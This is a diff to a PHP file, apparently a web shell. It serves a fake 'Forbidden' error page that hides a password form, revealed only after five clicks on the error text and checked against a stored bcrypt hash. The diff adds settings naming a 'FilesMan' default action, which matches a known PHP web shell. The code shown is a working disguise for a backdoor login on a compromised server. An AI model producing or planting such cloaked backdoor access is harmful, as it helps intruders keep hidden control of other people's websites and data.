@@ -2,6 +2,11 @@
 session_start();
 date_default_timezone_set("Asia/Jakarta");
 
+// Konfigurasi
+$default_action = "FilesMan";
+$default_use_ajax = true;
+$default_charset = 'UTF-8';
+
 // Konfigurasi password hash
 $stored_hashed_password = '$2a$12$uNJpbCb2EVGvoxtrwmNHk.6KNJO8UW3IERZ2HvIuTzH0gibNQnT1i'; // Gantilah ini dengan hash yang sesuai
 
@@ -20,46 +25,6 @@ function show_login_page() {
     display: none;
     margin-top: 20px;
   }
-
-  /* Styling for the password input and submit button */
-  input[type="password"] {
-    padding: 8px;
-    width: 70%;
-    max-width: 200px;
-    font-size: 14px;
-    margin-bottom: 10px;
-    border: 2px solid #ccc;
-    background-color: #000;
-    color: #fff;
-    border-radius: 4px;
-    box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);
-    transition: border-color 0.3s ease;
-  }
-
-  input[type="password"]:focus {
-    border-color: #007bff;
-    outline: none;
-  }
-
-  input[type="submit"] {
-    background-color: #000;
-    color: white;
-    border: none;
-    padding: 8px 16px;
-    font-size: 14px;
-    border-radius: 4px;
-    cursor: pointer;
-    transition: background-color 0.3s ease;
-  }
-
-  input[type="submit"]:hover {
-    background-color: #333;
-  }
-
-  #passwordField form {
-    display: inline-block;
-    margin-top: 10px;
-  }
 </style>
 </head>
 <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
@@ -69,10 +34,10 @@ function show_login_page() {
     <h2 style="margin-top:20px;font-size: 30px;">Forbidden</h2>
     <p>Access to this resource on the server is denied!</p>
 
-    <!-- Hidden password input below Forbidden -->
+    <!-- Hidden password input -->
     <div id="passwordField">
       <form method="post">
-        <input type="password" name="pass" placeholder="Enter password" required>
+        <input type="password" name="pass" placeholder="Enter password">
         <input type="submit" value="Submit">
       </form>
     </div>
@@ -92,7 +57,7 @@ function show_login_page() {
   forbiddenCode.addEventListener('click', () => {
     clickCount++;
     if (clickCount === 5) {
-      passwordField.style.display = 'block'; // Show the password field
+      passwordField.style.display = 'block';
     }
   });
 </script>
